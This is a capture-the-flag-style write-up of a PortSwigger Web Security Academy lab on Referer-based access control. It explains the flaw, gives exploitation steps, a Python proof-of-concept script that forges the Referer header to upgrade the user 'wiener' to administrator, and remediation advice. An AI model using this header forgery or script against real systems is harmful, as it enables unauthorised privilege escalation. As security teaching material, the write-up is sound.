# Referer-Based Access Control — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-08-06

## The Problem

The application decided whether to allow access to the admin-role-upgrade endpoint (`/admin-roles`) based on the `Referer` HTTP header — checking whether the request appeared to originate from the `/admin` page (implying the user had already navigated there as an admin), instead of properly verifying the requester's actual role.

The `Referer` header is entirely client-controlled: any client can set it to any value, so relying on it as a security check is fundamentally unsound — it indicates where the browser claims it came from, not who the user actually is.

## Discovery / Exploitation

1. Log in as a normal, low-privileged user (`wiener` / `peter`)
2. Attempt to access `/admin-roles?username=wiener&action=upgrade` directly — the server rejects it because the request has no `Referer` header pointing to `/admin`
3. Resend the same request, but manually add a forged `Referer` header claiming the request came from `/admin`:
   ```
   Referer: https://target-site.com/admin
   ```
4. The server, seeing the expected `Referer` value, treats the request as legitimate and performs the privilege upgrade — despite `wiener` never having actually accessed `/admin` as an authorized admin

## Impact

Any authenticated user can escalate their own privileges to admin simply by forging a single HTTP header. This is a critical vertical privilege escalation vulnerability, and it highlights that any header, cookie, or parameter fully controlled by the client can never be trusted as a substitute for real, server-side authorization.

## Proof of Concept (Python)

This script logs in as the low-privileged user, then sends the role-upgrade request with a forged `Referer` header pointing to `/admin` to bypass the flawed access control check.

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def upgrade_wiener_user(s, url):
    login_url = url + "/login"
    data_login = {'username': 'wiener', 'password': 'peter'}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "logout" in res:
        print("(+) successfully logged in as wiener user...")
        print("(+) upgrading user to administrator....")

        upgrade_url = url + '/admin-roles?username=wiener&action=upgrade'
        headers = {'Referer': url + '/admin'}
        r = s.get(upgrade_url, headers=headers, verify=False, proxies=proxies)

        if r.status_code == 200:
            print("(+) successfully upgraded user to administrator...")
        else:
            print("(-) could not upgrade user to administrator...")
            sys.exit(-1)
    else:
        print("(-) could not log in as wiener user...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    upgrade_wiener_user(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Logs in as `wiener` using a session so cookies persist
2. Sends the role-upgrade request with a manually crafted `Referer` header set to `<url>/admin` — spoofing the appearance of having navigated from the admin page
3. Checks the HTTP status code to confirm the upgrade request was accepted

## Remediation

The `Referer` header must never be used as an access control mechanism — it is fully controlled by the client and trivially forged. The server must instead verify the authenticated user's actual role from a trusted, server-side source (e.g. the database) before performing any privileged action, regardless of what headers accompany the request.
